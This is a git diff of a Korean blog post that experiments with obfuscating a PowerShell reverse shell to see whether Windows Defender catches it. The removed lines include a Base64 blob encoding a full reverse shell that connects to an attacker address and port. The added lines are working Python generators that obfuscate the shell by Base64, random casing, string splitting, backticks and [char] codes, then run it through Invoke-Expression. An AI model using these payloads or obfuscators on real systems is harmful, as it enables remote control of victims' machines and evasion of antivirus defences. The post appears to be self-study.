@@ -10,8 +10,6 @@ published: True
 
 공부를 하며 Linux 계열의 셸만을 주로 다루다보니 정작 윈도우의 셸인 PowerShell에 대해서는 잘 알지 못했고, PowerShell로 명령을 수행하는 것이 익숙하지 않아 매번 CLI 작업이 필요할 때에는 WSL2의 윈도우 마운트 드라이브로 넘어와 작업을 하곤 했다. 이번 기회를 통해 PowerShell을 맛보고, PowerShell의 난독화 기법에 대해 알아보았다.
 
-
-
 <br>
 
 <br>
@@ -74,7 +72,7 @@ $StreamWriter.Close()
 
 ![image](/assets/posts/250902-4.png)
 
-정상적으로 리스닝 중인 공격자 머신에서 PowerShell이 연결되는 것을 확인할 수 있다.
+정상적으로 리스닝 중인 공격자 머신에서 PowerShell이 연결되는 것을 확인할 수 있다. 이제 해당 코드를 입력으로 하여 다양한 방법으로 난독화할 수 있는 python 스크립트를 작성해보고, 이를 통해 생성된 난독화된 PowerShell 코드를 실행하여 Windows Defender가 이를 탐지하는지 확인해보았다.
 
 <br>
 
@@ -84,23 +82,38 @@ $StreamWriter.Close()
 
 ## Base64 Encoding
 
-위에서 작성한 Reverse Shell 연결 .ps1 코드를, 난독화 기법으로 많이 사용되는 Base64 인코딩을 적용하여 변환하였다.
+리버스 셸 코드에 Base64 인코딩을 적용하고, 이를 PowerShell에서 제공하는 Base64 복호화 기능을 이용하여 복원한 후, `Invoke-Expression`을 통해 평가되어 실행될 수 있도록 하는 방법이다.
 
-```powershell
-[Convert]::ToBase64String((Get-Content -Path "C:\Users\r4m\workspace\malware-workspace\revshell.ps1" -Encoding Byte -Raw))
+```python
+# base64_.py
+import base64
+
+
+def base64_obfuscation(revshell_code):
+    revshell_code = revshell_code.replace('\n', '')
+    revshell_code = revshell_code.replace('\r', '')
+    revshell_code = revshell_code.replace("'", '"')
+
+    b64 = base64.b64encode(revshell_code.encode('utf-8')).decode('utf-8')
+    new_revshell = f'[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("{b64}")) | Invoke-Expression'
+
+    return new_revshell
+
+if __name__ == "__main__":
+    with open('revshell.txt', 'r') as file:
+        revshell_code = file.read()
+
+        new_revshell = base64_obfuscation(revshell_code)
+
+        print(new_revshell)
+
+        with open('revshell.ps1', 'w') as file:
+            file.write(new_revshell)
 ```
 
 <br>
 
-명령을 실행하면 아래와 같은 인코딩 값을 얻을 수 있다.
-
-```
-77u/JExIT1NUID0gJzE5Mi4xNjguMTk1LjIwJzsNCiRMUE9SVCA9IDQ0NDQ7DQokVENQQ2xpZW50ID0gTmV3LU9iamVjdCBOZXQuU29ja2V0cy5UQ1BDbGllbnQoJExIT1NULCAkTFBPUlQpOw0KJE5ldHdvcmtTdHJlYW0gPSAkVENQQ2xpZW50LkdldFN0cmVhbSgpOw0KJFN0cmVhbVJlYWRlciA9IE5ldy1PYmplY3QgSU8uU3RyZWFtUmVhZGVyKCROZXR3b3JrU3RyZWFtKTsNCiRTdHJlYW1Xcml0ZXIgPSBOZXctT2JqZWN0IElPLlN0cmVhbVdyaXRlcigkTmV0d29ya1N0cmVhbSk7DQokU3RyZWFtV3JpdGVyLkF1dG9GbHVzaCA9ICR0cnVlOw0KJEJ1ZmZlciA9IE5ldy1PYmplY3QgU3lzdGVtLkJ5dGVbXSAxMDI0Ow0Kd2hpbGUgKCRUQ1BDbGllbnQuQ29ubmVjdGVkKSB7DQogICAgd2hpbGUgKCROZXR3b3JrU3RyZWFtLkRhdGFBdmFpbGFibGUpIHsNCiAgICAgICAgJFJhd0RhdGEgPSAkTmV0d29ya1N0cmVhbS5SZWFkKCRCdWZmZXIsIDAsICRCdWZmZXIuTGVuZ3RoKTsNCiAgICAgICAgJENvZGUgPSAoW3RleHQuZW5jb2RpbmddOjpVVEY4KS5HZXRTdHJpbmcoJEJ1ZmZlciwgMCwgJFJhd0RhdGEgLTEpDQogICAgfTsNCg0KICAgIGlmICgkVENQQ2xpZW50LkNvbm5lY3RlZCAtYW5kICRDb2RlLkxlbmd0aCAtZ3QgMSkgew0KICAgICAgICAkT3V0cHV0ID0gdHJ5IHsgSW52b2tlLUV4cHJlc3Npb24gKCRDb2RlKSAyPiYxIH0gY2F0Y2ggeyAkXyB9Ow0KICAgICAgICAkU3RyZWFtV3JpdGVyLldyaXRlKCIkT3V0cHV0YG4iKTsNCiAgICAgICAgJENvZGUgPSAkbnVsbA0KICAgIH0NCn07DQokVENQQ2xpZW50LkNsb3NlKCk7DQokTmV0d29ya1N0cmVhbS5DbG9zZSgpOw0KJFN0cmVhbVJlYWRlci5DbG9zZSgpOw0KJFN0cmVhbVdyaXRlci5DbG9zZSgpDQo=
-```
-
-<br>
-
-인코딩된 값과 함께 PowerShell 실행 시 식에 대한 평가를 진행할 수 있도록 인자를 주어 `powershell -EncodedCommand <인코딩된 값>` 형태로 사용할 수 있다. 그러나, 이 코드를 .ps1 파일에 저장함과 동시에 Windows Defender에 의해 차단되는 것을 확인할 수 있다.
+코드를 실행하여 .ps1 파일이 생성됨과 동시에 Windows Defender에 의해 차단되는 것을 확인할 수 있다.
 
 <br>
 
@@ -114,26 +127,32 @@ $StreamWriter.Close()
 
 ```python
 # random_case.py
-revshell_code = ""
-with open('revshell.txt', 'r') as file:
-    revshell_code = file.read()
 
-revshell_code = revshell_code.replace('\n', '')
-revshell_code = revshell_code.replace('\r', '')
-revshell_code = revshell_code.replace(' ', '')
-revshell_code = revshell_code.lower()
+def random_case_obfuscation(revshell_code):
+    revshell_code = revshell_code.replace('\n', '')
+    revshell_code = revshell_code.replace('\r', '')
+    revshell_code = revshell_code.replace(' ', '')
+    revshell_code = revshell_code.lower()
 
-new_revshell = ""
-for index, char in enumerate(revshell_code):
-    if index % 2 == 0:
-        new_revshell += char.upper()
-    else:
-        new_revshell += char
+    new_revshell = ""
+    for index, char in enumerate(revshell_code):
+        if index % 2 == 0:
+            new_revshell += char.upper()
+        else:
+            new_revshell += char
 
-print(new_revshell)
+    return new_revshell
 
-with open('revshell.ps1', 'w') as file:
-    file.write(new_revshell)
+if __name__ == "__main__":
+    with open('revshell.txt', 'r') as file:
+        revshell_code = file.read()
+
+        new_revshell = random_case_obfuscation(revshell_code)
+
+        print(new_revshell)
+
+        with open('revshell.ps1', 'w') as file:
+            file.write(new_revshell)
 ```
 
 위의 코드로 대소문자가 섞인 난독화된 PowerShell Reverse Shell 코드를 생성할 수 있다. 그러나 이 방법도 파일이 생성됨과 동시에 Windows Defender에 의해 차단되는 것을 확인할 수 있다.
@@ -141,7 +160,7 @@ with open('revshell.ps1', 'w') as file:
 <br>
 <br>
 
-## Division
+## Division/Whitespace
 
 PowerShell에서 `'String' + 'String'` 형태로 문자열을 결합할 수 있고, 이를 이용하여 난독화된 코드를 생성할 수 있다. PowerShell에서 문자들이 결합하여 문자열을 이룰 수 있도록 싱글 쿼터와 더블 쿼터를 모두 하나로 맞춰주고, 문자열이 결합된 후에 이 식이 평가되어 실행될 수 있도록 `Invoke-Expression`을 이용한다.
 
@@ -149,34 +168,41 @@ PowerShell에서 `'String' + 'String'` 형태로 문자열을 결합할 수 있�
 
 ```python
 # division.py
-revshell_code = ''
-with open('revshell.txt', 'r') as file:
-    revshell_code = file.read()
 
-revshell_code = revshell_code.replace('\n', '')
-revshell_code = revshell_code.replace('\r', '')
-revshell_code = revshell_code.replace(' ', '')
-revshell_code = revshell_code.replace("'", '"')
+def division_obfuscation(revshell_code):
+    revshell_code = revshell_code.replace('\n', '')
+    revshell_code = revshell_code.replace('\r', '')
+    revshell_code = revshell_code.replace(' ', '')
+    revshell_code = revshell_code.replace("'", '"')
 
-new_revshell = '$str='
-for index, char in enumerate(revshell_code):
+    new_revshell = '$str='
+    for index, char in enumerate(revshell_code):
 
-    if index % 3 == 0:
-        new_revshell += f"'{char}"
-    elif index % 3 == 1:
-        new_revshell += f"{char}'"
-    else:
-        new_revshell += f"+'{char}'+"
+        if index % 3 == 0:
+            new_revshell += f"'{char}"
+        elif index % 3 == 1:
+            new_revshell += f"{char}'"
+        else:
+            new_revshell += f"+'{char}'+"
 
-if new_revshell.endswith("+"):
-    new_revshell = new_revshell[:-1]
+    if new_revshell.endswith("+"):
+        new_revshell = new_revshell[:-1]
 
-new_revshell += ';Invoke-Expression $str'
+    new_revshell += ';Invoke-Expression $str'
 
-print(new_revshell)
+    return new_revshell
 
-with open('revshell.ps1', 'w') as file:
-    file.write(new_revshell)
+
+if __name__ == "__main__":
+    with open('revshell.txt', 'r') as file:
+        revshell_code = file.read()
+
+        new_revshell = division_obfuscation(revshell_code)
+
+        print(new_revshell)
+
+        with open('revshell.ps1', 'w') as file:
+            file.write(new_revshell)
 ```
 
 <br>
@@ -202,6 +228,7 @@ with open('revshell.ps1', 'w') as file:
 
 ```python
 # reorder.py
+
 import random
 
 revshell_code = ''
@@ -238,6 +265,114 @@ with open('revshell.ps1', 'w') as file:
 
 `Write-Output` 명령어를 통해 난독화된 코드가 정상적으로 복원되는 것을 확인할 수 있고, .ps1 파일 생성 시에도 Windows Defender에 의해 차단되지 않는 것을 확인할 수 있다. 그러나, 마찬가지로 해당 파일을 실행하면 Windows Defender에 의해 차단되는 것을 확인할 수 있다.
 
+<br>
+<br>
+
+
+## Back Ticks
+
+PowerShell에서 백틱(``` ` ```)은 이스케이프 문자로 사용되며, 이를 이용하여 난독화된 코드를 생성할 수 있다. 백틱을 이용하여 코드 내의 특수 문자를 이스케이프 처리함으로써, 코드가 정상적으로 평가되어 실행될 수 있도록 한다. 기본적인 셸 코드에 구조 상 backtick을 추가하기에 어려움이 있어, base64 인코딩을 거친 후에 backtick을 추가하는 방식으로 스크립트를 구성하였다.
+
+<br>
+
+```python
+# back_ticks.py
+
+import base64
+import string
+
+import base64_
+
+
+def back_ticks_obfuscation(revshell_code):
+    revshell_code = revshell_code.replace('\n', '')
+    revshell_code = revshell_code.replace('\r', '')
+    revshell_code = revshell_code.replace("'", '"')
+
+    new_revshell = ''
+    flag = False
+    for char in revshell_code:
+        if char not in ['"', 'n', 't', 'r', ' '] and char in string.ascii_letters:
+            new_revshell += '`' + char
+            flag = True
+        else:
+            if flag:
+                new_revshell += '`' + char
+                flag = False
+            else:
+                new_revshell += char
+
+    if new_revshell[0] == '`':
+        new_revshell = new_revshell[1:]
+
+    new_revshell = f"$str='{new_revshell}';Invoke-Expression $str"
+
+    return new_revshell
+
+
+if __name__ == "__main__":
+    with open('revshell.txt', 'r') as file:
+        revshell_code = file.read()
+
+        base64_revshell = base64.b64encode(revshell_code.encode()).decode()
+
+        new_revshell = back_ticks_obfuscation(base64_revshell)
+
+        print(new_revshell)
+
+        with open('revshell.ps1', 'w') as file:
+            file.write(new_revshell)
+```
+
+<br>
+
+생성된 .ps1 파일은 backtick이 추가되었음에도 불구하고 여전히 Windows Defender에 의해 차단되는 것을 확인할 수 있다.
+
+<br>
+<br>
+
+## Ascii char assigns
+
+PowerShell에서는 `[char]ascii_code` 형식으로 ASCII 문자를 표현할 수 있다. 예를 들어, `[char]65`는 'A'를 의미한다. 이를 활용하여 난독화된 코드를 생성할 수 있다.
+
+<br>
+
+```python
+def ascii_char_assigns_obfuscation(revshell_code):
+
+    revshell_code = revshell_code.replace('\n', '')
+    revshell_code = revshell_code.replace('\r', '')
+    revshell_code = revshell_code.replace("'", '"')
+
+    new_revshell = ''
+    for char in revshell_code:
+        new_revshell += f"[char]{ord(char)}+"
+
+    if new_revshell.endswith('+'):
+        new_revshell = new_revshell[:-1]
+
+    new_revshell = f"$str={new_revshell};Invoke-Expression $str"
+
+    return new_revshell
+
+if __name__ == "__main__":
+    with open('revshell.txt', 'r') as file:
+        revshell_code = file.read()
+
+        new_revshell = ascii_char_assigns_obfuscation(revshell_code)
+
+        print(new_revshell)
+
+        with open('revshell.ps1', 'w') as file:
+            file.write(new_revshell)
+```
+
+<br>
+
+스크립트를 실행하면 .ps1 파일은 정상적으로 생성되는 것을 확인할 수 있으나, 실행 시에 Windows Defender에 의해 차단되는 것을 확인할 수 있다.
+
+<br>
+<br>
 
 > **Reference**
 >
